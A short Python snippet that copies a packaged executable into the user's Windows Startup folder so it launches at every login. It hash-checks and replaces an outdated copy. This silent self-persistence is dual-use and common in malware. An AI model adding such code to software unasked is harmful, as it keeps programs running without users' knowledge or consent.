import hashlib
import os
import shutil
import sys

def md5sum(file_path):
    with open(file_path, 'rb') as file:
        md5_hash = hashlib.md5()
        while True:
            data = file.read(4096)
            if not data:
                break
            md5_hash.update(data)
    return md5_hash.hexdigest()

def add_to_autostart():
    username = os.getlogin()
    if getattr(sys, 'frozen', False):
        exe_path = sys.executable
        exe_name = os.path.basename(sys.executable)
        path = f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{exe_name}"
        if os.path.isfile(path):
            if not md5sum(path) == md5sum(exe_path):
                os.remove(path)
                shutil.copyfile(exe_path, path)
        else:
            shutil.copyfile(exe_path, path)
